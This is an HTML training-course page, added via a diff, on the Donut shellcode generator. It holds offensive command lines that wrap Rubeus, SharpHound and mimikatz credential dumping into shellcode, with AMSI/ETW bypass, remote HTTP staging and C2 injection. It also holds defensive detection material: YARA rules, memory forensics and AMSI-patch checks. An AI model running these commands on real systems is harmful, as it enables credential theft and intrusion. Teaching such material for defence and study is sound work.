@@ -1,0 +1,378 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Module 8: Full Chain, Integration &amp; Detection - Donut Course</title>
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>&#x1F369;</text></svg>">
+<link rel="stylesheet" href="../../../assets/course.css">
+<style>:root{--accent:#ec4899;--accent2:#db2777;--gradient:linear-gradient(135deg,#ec4899,#db2777)}</style>
+</head>
+<body>
+
+<button class="hamburger" aria-label="Toggle navigation">&#9776;</button>
+
+<nav>
+<div class="logo">
+<h2>Donut Course</h2>
+<span>PE-to-Shellcode Masterclass</span>
+</div>
+<a class="home-link" href="../Donut_index.html">&larr; Course Home</a>
+<a class="mod-link" href="module1.html"><span>1. The PE-to-Shellcode Problem</span><span class="diff d1">B</span></a>
+<a class="mod-link" href="module2.html"><span>2. PE Loader Fundamentals</span><span class="diff d1">B</span></a>
+<a class="mod-link" href="module3.html"><span>3. .NET CLR Hosting</span><span class="diff d1">B</span></a>
+<a class="mod-link" href="module4.html"><span>4. Module Architecture</span><span class="diff d2">I</span></a>
+<a class="mod-link" href="module5.html"><span>5. The Donut Loader</span><span class="diff d2">I</span></a>
+<a class="mod-link" href="module6.html"><span>6. Encryption &amp; Anti-Detection</span><span class="diff d2">I</span></a>
+<a class="mod-link" href="module7.html"><span>7. Advanced Payload Types</span><span class="diff d3">A</span></a>
+<a class="mod-link active" href="module8.html"><span>8. Full Chain &amp; Detection</span><span class="diff d3">A</span></a>
+</nav>
+
+<main>
+<span class="diff-badge hard">Difficulty: Advanced</span>
+<h1>Module 8: Full Chain, Integration &amp; Detection</h1>
+<p class="subtitle">Putting it all together: command-line usage, C API integration, detection vectors, YARA rules, and memory forensics for Donut payloads.</p>
+
+<div class="card highlight">
+<h4>Module Objective</h4>
+<p>Learn Donut&rsquo;s complete command-line interface and C API for programmatic shellcode generation. Understand the detection landscape: what defenders look for, how to write YARA rules for Donut artifacts, memory forensics techniques for identifying Donut loaders, and the limitations of current bypasses.</p>
+</div>
+
+<!-- ============================================================ -->
+<h2>1. Command-Line Usage</h2>
+
+<p>Donut&rsquo;s command-line interface provides full access to all generation options:</p>
+
+<pre><span class="lang-tag">Shell</span># Basic: Convert a .NET EXE to shellcode
+donut -f Rubeus.exe
+
+# .NET EXE with arguments
+donut -f Seatbelt.exe -p "-group=all"
+
+# .NET DLL with class, method, and arguments
+donut -f SharpHound.dll -c SharpHound.Program -m Main -p "--CollectionMethods All"
+
+# Native DLL: call specific export with arguments
+donut -f payload.dll -m RunPayload -p "config_string"
+
+# Native EXE with arguments
+donut -f mimikatz.exe -p "privilege::debug sekurlsa::logonpasswords exit"
+
+# VBScript payload
+donut -f payload.vbs
+
+# Full options: x64, AMSI/ETW bypass, aPLib compression, exit thread
+donut -f Rubeus.exe -a 2 -b 3 -z 1 -e 1 -p "kerberoast"
+
+# HTTP staging: host module on remote server
+donut -f Rubeus.exe -u http://10.0.0.1/module -p "kerberoast"
+
+# Output as different formats
+donut -f payload.exe -o payload.bin         # Raw binary (default)
+donut -f payload.exe -o payload.b64 -f 2    # Base64
+donut -f payload.exe -o payload.c -f 3      # C array
+donut -f payload.exe -o payload.rb -f 4     # Ruby
+donut -f payload.exe -o payload.py -f 5     # Python
+donut -f payload.exe -o payload.ps1 -f 6    # PowerShell
+donut -f payload.exe -o payload.cs -f 7     # C#
+donut -f payload.exe -o payload.hex -f 8    # Hex string</pre>
+
+<table>
+<tr><th>Flag</th><th>Option</th><th>Values</th></tr>
+<tr><td><code>-f</code></td><td>Input file</td><td>Path to PE, .NET, VBS, JS, or XSL file</td></tr>
+<tr><td><code>-a</code></td><td>Architecture</td><td>1 = x86, 2 = x64, 3 = x86+x64 (dual)</td></tr>
+<tr><td><code>-b</code></td><td>Bypass level</td><td>1 = none, 2 = abort on fail, 3 = continue on fail</td></tr>
+<tr><td><code>-z</code></td><td>Compression</td><td>1 = none, 2 = aPLib, 3 = LZNT1, 4 = Xpress, 5 = Xpress Huffman</td></tr>
+<tr><td><code>-e</code></td><td>Exit option</td><td>1 = exit thread, 2 = exit process, 3 = don&rsquo;t exit</td></tr>
+<tr><td><code>-o</code></td><td>Output file</td><td>Path for generated shellcode (default: loader.bin)</td></tr>
+<tr><td><code>-c</code></td><td>Class name</td><td>For .NET DLL: fully qualified class name</td></tr>
+<tr><td><code>-m</code></td><td>Method/Export</td><td>.NET: method name. DLL: export name</td></tr>
+<tr><td><code>-p</code></td><td>Parameters</td><td>Arguments passed to the payload</td></tr>
+<tr><td><code>-u</code></td><td>Staging URL</td><td>HTTP(S) URL for remote module hosting</td></tr>
+<tr><td><code>-t</code></td><td>New thread</td><td>1 = run payload in a new thread</td></tr>
+</table>
+
+<!-- ============================================================ -->
+<h2>2. C API Integration</h2>
+
+<p>Donut exposes a C API through <code>donut.h</code> for programmatic shellcode generation. This allows integration into custom tooling, C2 frameworks, and automated pipelines:</p>
+
+<pre><span class="lang-tag">C</span>#include "donut.h"
+
+int main(void) {
+    DONUT_CONFIG config;
+    memset(&amp;config, 0, sizeof(config));
+
+    // Configure the generation
+    config.arch     = DONUT_ARCH_X64;
+    config.bypass   = DONUT_BYPASS_CONTINUE;
+    config.compress = DONUT_COMPRESS_APLIB;
+    config.exit_opt = DONUT_OPT_EXIT_THREAD;
+    config.entropy  = DONUT_ENTROPY_DEFAULT;
+    config.format   = DONUT_FORMAT_BINARY;
+
+    strncpy(config.input, "Rubeus.exe", DONUT_MAX_NAME);
+    strncpy(config.param, "kerberoast", DONUT_MAX_NAME);
+
+    // Generate the shellcode
+    int err = DonutCreate(&amp;config);
+    if (err != DONUT_ERROR_SUCCESS) {
+        printf("Error: %d\n", err);
+        return 1;
+    }
+
+    // config.pic     = pointer to generated shellcode
+    // config.pic_len = size of shellcode in bytes
+    printf("Shellcode: %p (%d bytes)\n", config.pic, config.pic_len);
+
+    // Write to file, inject, or use as needed
+    FILE *f = fopen("loader.bin", "wb");
+    fwrite(config.pic, 1, config.pic_len, f);
+    fclose(f);
+
+    // Free the allocated shellcode
+    DonutDelete(&amp;config);
+
+    return 0;
+}</pre>
+
+<div class="card">
+<h4>API Functions</h4>
+<table>
+<tr><th>Function</th><th>Purpose</th></tr>
+<tr><td><code>DonutCreate(&amp;config)</code></td><td>Generate shellcode based on the config. Returns error code. Populates <code>config.pic</code> and <code>config.pic_len</code>.</td></tr>
+<tr><td><code>DonutDelete(&amp;config)</code></td><td>Free the allocated shellcode memory. Must be called after <code>DonutCreate</code>.</td></tr>
+</table>
+</div>
+
+<!-- ============================================================ -->
+<h2>3. Integration with C2 Frameworks</h2>
+
+<p>Donut is commonly integrated into C2 frameworks for in-memory payload execution. The typical integration pattern is:</p>
+
+<div class="diagram">
+<h4>C2 Integration Flow</h4>
+<div class="flow">
+<div class="box">Operator<br><small>Selects payload</small></div>
+<div class="arrow">&rarr;</div>
+<div class="box hl">C2 Server<br><small>Calls DonutCreate()</small></div>
+<div class="arrow">&rarr;</div>
+<div class="box y">Shellcode<br><small>Sent to implant</small></div>
+<div class="arrow">&rarr;</div>
+<div class="box">Implant<br><small>Injects shellcode</small></div>
+<div class="arrow">&rarr;</div>
+<div class="box g">Payload Runs<br><small>In target process</small></div>
+</div>
+</div>
+
+<p>Frameworks like Covenant, PoshC2, and Sliver have integrated or can use Donut for converting .NET tools to injectable shellcode. The operator selects a tool (e.g., Seatbelt), the C2 server generates shellcode via Donut, and the implant receives and injects it.</p>
+
+<!-- ============================================================ -->
+<h2>4. Detection Vector: CLR Loading Events</h2>
+
+<p>When Donut loads a .NET assembly, the CLR initialization generates detectable events:</p>
+
+<table>
+<tr><th>Event Source</th><th>What It Reveals</th><th>Detection Value</th></tr>
+<tr><td><strong>ETW: Microsoft-Windows-DotNETRuntime</strong></td><td>Assembly load events with byte array source (no file path)</td><td>High &mdash; legitimate loads have file paths</td></tr>
+<tr><td><strong>ETW: Assembly/Loader keyword</strong></td><td>CLR version, AppDomain creation, assembly name</td><td>Medium &mdash; new AppDomains in unexpected processes</td></tr>
+<tr><td><strong>Module load callbacks</strong></td><td><code>clr.dll</code> / <code>mscorlib.dll</code> loaded in unmanaged processes</td><td>High &mdash; CLR in notepad.exe is anomalous</td></tr>
+<tr><td><strong>Named pipes</strong></td><td>CLR debugging pipes created during initialization</td><td>Low &mdash; only present with specific CLR versions</td></tr>
+</table>
+
+<div class="card warn">
+<h4>CLR in Unmanaged Processes</h4>
+<p>The strongest detection signal for Donut .NET payloads is <code>clr.dll</code> being loaded into a process that normally does not host the CLR. If <code>svchost.exe</code> or <code>notepad.exe</code> suddenly loads the .NET runtime, this is highly suspicious. Defenders monitor for this via kernel callbacks (<code>PsSetLoadImageNotifyRoutine</code>) or ETW image load events.</p>
+</div>
+
+<!-- ============================================================ -->
+<h2>5. Detection Vector: Memory Forensics</h2>
+
+<p>Even after encryption, Donut leaves forensic artifacts in memory that can be identified:</p>
+
+<table>
+<tr><th>Artifact</th><th>Location</th><th>Description</th></tr>
+<tr><td><strong>Unbacked executable memory</strong></td><td>Process VAD tree</td><td>Private <code>PAGE_EXECUTE_READ</code> regions with no file backing &mdash; the loader code</td></tr>
+<tr><td><strong>PE headers in private memory</strong></td><td>After PE loading</td><td>MZ/PE signatures in non-file-backed memory after the payload is mapped</td></tr>
+<tr><td><strong>Decrypted DONUT_INSTANCE</strong></td><td>Adjacent to loader code</td><td>The instance structure with API pointers and configuration data</td></tr>
+<tr><td><strong>COM interface vtables</strong></td><td>Stack/heap</td><td>References to CLR and scripting COM interfaces from the hosting code</td></tr>
+<tr><td><strong>AMSI patch artifacts</strong></td><td><code>amsi.dll</code> .text section</td><td>Modified bytes at the start of <code>AmsiScanBuffer</code></td></tr>
+</table>
+
+<pre><span class="lang-tag">Python</span># Volatility3 plugin concept for detecting Donut artifacts
+# Look for CLR in unexpected processes
+
+def detect_donut_clr(self):
+    for proc in self.list_processes():
+        modules = self.get_loaded_modules(proc)
+        module_names = [m.BaseDllName.lower() for m in modules]
+
+        if 'clr.dll' in module_names:
+            # Check if this process normally hosts the CLR
+            proc_name = proc.ImageFileName.lower()
+            if proc_name not in KNOWN_CLR_HOSTS:
+                yield DetectionResult(
+                    pid=proc.pid,
+                    process=proc_name,
+                    finding="CLR loaded in unexpected process",
+                    severity="HIGH"
+                )</pre>
+
+<!-- ============================================================ -->
+<h2>6. Detection Vector: AMSI/ETW Patching</h2>
+
+<p>Donut&rsquo;s bypass stubs modify function prologues in loaded DLLs. Defenders can detect these patches:</p>
+
+<pre><span class="lang-tag">C</span>// Detection: Check if AmsiScanBuffer has been patched
+BOOL IsAMSIPatched(void) {
+    HMODULE amsi = GetModuleHandleA("amsi.dll");
+    if (!amsi) return FALSE;
+
+    FARPROC scan = GetProcAddress(amsi, "AmsiScanBuffer");
+    if (!scan) return FALSE;
+
+    BYTE *code = (BYTE*)scan;
+
+    // Check for common patch patterns:
+    // xor eax, eax; ret  (0x31, 0xC0, 0xC3)
+    if (code[0] == 0x31 &amp;&amp; code[1] == 0xC0 &amp;&amp; code[2] == 0xC3)
+        return TRUE;
+
+    // mov eax, 0x80070057; ret (E_INVALIDARG)
+    if (code[0] == 0xB8 &amp;&amp; code[1] == 0x57 &amp;&amp; code[2] == 0x00)
+        return TRUE;
+
+    // Check against the known clean prologue from the DLL on disk
+    // Compare first N bytes against the file-backed version
+    return FALSE;
+}</pre>
+
+<div class="card">
+<h4>Integrity Checking</h4>
+<p>EDR products periodically compare the in-memory contents of critical functions (like <code>AmsiScanBuffer</code>, <code>EtwEventWrite</code>) against the on-disk DLL. Any differences indicate runtime patching. Some EDRs also hook <code>VirtualProtect</code> and flag permission changes to <code>.text</code> sections of security-relevant DLLs.</p>
+</div>
+
+<!-- ============================================================ -->
+<h2>7. YARA Rules for Donut</h2>
+
+<p>YARA rules can detect Donut artifacts at various stages. Note that because Donut encrypts the payload, YARA is most effective against the loader code itself or unencrypted (entropy=none) variants:</p>
+
+<pre><span class="lang-tag">YARA</span>rule donut_loader_strings {
+    meta:
+        description = "Detects Donut loader artifacts"
+        author      = "Defense Team"
+
+    strings:
+        // API hash resolution patterns
+        $hash_loop = { 0F B6 ?? 6A ?? 5? 0F AF ?? 03 }
+
+        // Chaskey ROTR32 round constant pattern (right rotations by 27, 24, 16, 19, 25)
+        $chaskey = { C1 C? 1B 33 C? C1 C? 18 }
+
+        // AMSI bypass patch bytes
+        $amsi_patch = { 31 C0 C3 }
+
+        // CLR hosting GUIDs (CLSID_CLRMetaHost)
+        $clr_guid = { 60 F1 19 92 33 44 CE 4A
+                       BD E6 17 7B 31 85 C9 0B }
+
+        // ICorRuntimeHost IID
+        $cor_iid  = { 02 C5 27 CB 83 97 B2 11
+                      D3 8B 00 00 F8 08 34 2D }
+
+    condition:
+        2 of them
+}</pre>
+
+<div class="card warn">
+<h4>YARA Limitations</h4>
+<p>Because Donut generates unique shellcode with random keys on every run, signature-based detection of the encrypted payload is not feasible. YARA rules primarily target the loader code (which is relatively static between versions) or the GUIDs for COM interfaces (which are constants). Custom-compiled Donut variants can trivially evade these rules.</p>
+</div>
+
+<!-- ============================================================ -->
+<h2>8. Defensive Recommendations</h2>
+
+<table>
+<tr><th>Defense Layer</th><th>Technique</th><th>What It Catches</th></tr>
+<tr><td><strong>ETW Monitoring</strong></td><td>Monitor .NET runtime and assembly load events</td><td>CLR loading in unexpected processes, fileless assembly loads</td></tr>
+<tr><td><strong>Module Load Callbacks</strong></td><td><code>PsSetLoadImageNotifyRoutine</code> for clr.dll</td><td>CLR initialization in anomalous processes</td></tr>
+<tr><td><strong>Memory Scanning</strong></td><td>Periodic scan of private executable memory</td><td>PE headers in unbacked memory, loader code signatures</td></tr>
+<tr><td><strong>Integrity Monitoring</strong></td><td>Verify AMSI/ETW function prologues against on-disk copies</td><td>Runtime patching of security functions</td></tr>
+<tr><td><strong>Behavioral Analysis</strong></td><td>Monitor VirtualProtect on .text sections of amsi.dll/ntdll.dll</td><td>Bypass stub installation</td></tr>
+<tr><td><strong>Network Monitoring</strong></td><td>Detect staging server connections</td><td>HTTP/DNS staging downloads</td></tr>
+<tr><td><strong>YARA/Sigma</strong></td><td>Loader code patterns, COM GUID constants</td><td>Known Donut versions (limited by recompilation)</td></tr>
+</table>
+
+<!-- ============================================================ -->
+<h2>9. The Complete Chain</h2>
+
+<div class="diagram">
+<h4>Full Donut Execution Chain</h4>
+<div class="flow">
+<div class="box">Generate<br><small>donut -f payload</small></div>
+<div class="arrow">&rarr;</div>
+<div class="box">Deliver<br><small>Inject / Stage</small></div>
+<div class="arrow">&rarr;</div>
+<div class="box hl">Find Instance<br><small>RIP-relative</small></div>
+<div class="arrow">&rarr;</div>
+<div class="box">PEB Walk<br><small>Resolve APIs</small></div>
+<div class="arrow">&rarr;</div>
+<div class="box y">Decrypt<br><small>Instance + Module</small></div>
+<div class="arrow">&rarr;</div>
+<div class="box">Bypass<br><small>AMSI/ETW/WLDP</small></div>
+<div class="arrow">&rarr;</div>
+<div class="box">Decompress<br><small>aPLib/LZNT1</small></div>
+<div class="arrow">&rarr;</div>
+<div class="box g">Execute<br><small>PE/CLR/COM</small></div>
+</div>
+</div>
+
+<div class="complete-card">
+<h3>Course Complete</h3>
+<p>You have completed the Donut PE-to-Shellcode Masterclass. You now understand the complete architecture from PE loading fundamentals through CLR hosting, Chaskey encryption, PIC loader internals, and the full detection landscape. Use this knowledge to build better offensive tools and stronger defensive detections.</p>
+</div>
+
+<!-- ============================================================ -->
+<div class="quiz" id="q8">
+<h4>Knowledge Check</h4>
+
+<div class="quiz-q" data-correct="2">
+<p>1. What is the strongest detection signal for Donut .NET payloads?</p>
+<label data-opt="0"><input type="radio" name="q8_1">YARA rules matching encrypted payload bytes</label>
+<label data-opt="1"><input type="radio" name="q8_1">Network signatures from staging downloads</label>
+<label data-opt="2"><input type="radio" name="q8_1">CLR (clr.dll) being loaded into processes that normally don&rsquo;t host the .NET runtime</label>
+<label data-opt="3"><input type="radio" name="q8_1">High CPU usage during assembly loading</label>
+<div class="explain">The CLR being loaded into an unmanaged process (e.g., notepad.exe or svchost.exe loading clr.dll) is a strong anomaly indicator. Defenders monitor for this via kernel image load callbacks or ETW module load events. The encrypted payload itself is not detectable via signatures due to per-generation randomization.</div>
+</div>
+
+<div class="quiz-q" data-correct="0">
+<p>2. Which Donut API function generates shellcode from a DONUT_CONFIG structure?</p>
+<label data-opt="0"><input type="radio" name="q8_2"><code>DonutCreate(&amp;config)</code></label>
+<label data-opt="1"><input type="radio" name="q8_2"><code>DonutGenerate(&amp;config)</code></label>
+<label data-opt="2"><input type="radio" name="q8_2"><code>DonutBuild(&amp;config)</code></label>
+<label data-opt="3"><input type="radio" name="q8_2"><code>DonutCompile(&amp;config)</code></label>
+<div class="explain"><code>DonutCreate(&amp;config)</code> is the main API function. It takes a populated <code>DONUT_CONFIG</code> structure, generates the shellcode, and stores the result in <code>config.pic</code> (pointer) and <code>config.pic_len</code> (size). <code>DonutDelete(&amp;config)</code> frees the allocated memory.</div>
+</div>
+
+<div class="quiz-q" data-correct="3">
+<p>3. Why are YARA signatures limited in effectiveness against Donut shellcode?</p>
+<label data-opt="0"><input type="radio" name="q8_3">Donut shellcode is too small for signature matching</label>
+<label data-opt="1"><input type="radio" name="q8_3">YARA cannot scan process memory</label>
+<label data-opt="2"><input type="radio" name="q8_3">Donut uses anti-debugging to prevent YARA scans</label>
+<label data-opt="3"><input type="radio" name="q8_3">Each generation uses random keys, producing unique ciphertext; only the static loader code is signaturable</label>
+<div class="explain">Donut generates fresh random encryption keys for every shellcode generation, meaning the encrypted payload portion is different every time. YARA can only reliably match the PIC loader code (which is relatively static between versions) or hardcoded constants like COM GUIDs. Custom-compiled Donut variants can further evade even these signatures.</div>
+</div>
+
+<button class="quiz-btn" onclick="gradeQuiz('q8')">Check Answers</button>
+<div class="quiz-result"></div>
+</div>
+
+<div class="nav-btns">
+<a href="module7.html">&larr; Previous: Advanced Payload Types</a>
+<a class="primary" href="../Donut_index.html">Back to Course Home</a>
+</div>
+</main>
+
+<script src="../../../assets/course.js"></script>
+</body>
+</html>
